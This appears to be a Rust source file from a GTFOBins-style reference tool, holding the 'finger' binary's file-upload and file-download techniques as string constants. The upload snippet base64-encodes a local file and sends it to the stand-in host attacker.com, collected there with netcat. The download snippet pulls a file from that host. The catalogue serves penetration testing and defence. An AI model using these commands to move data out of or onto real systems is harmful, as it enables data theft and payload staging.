
pub static BIN_NAME: &'static str = "finger";
pub static FU_DESC: &'static str = "Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > 'file_to_save'` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    LFILE=file_to_send
    finger "$(base64 $LFILE)@$RHOST"
"#;
pub static FD_DESC: &'static str = "Fetch remote binary file from a remote TCP port. Run `base64 'file_to_send' | sudo nc -l -p 79` on the attacker box to send the file.";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    LFILE=file_to_save
    finger x@$RHOST | base64 -d > "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
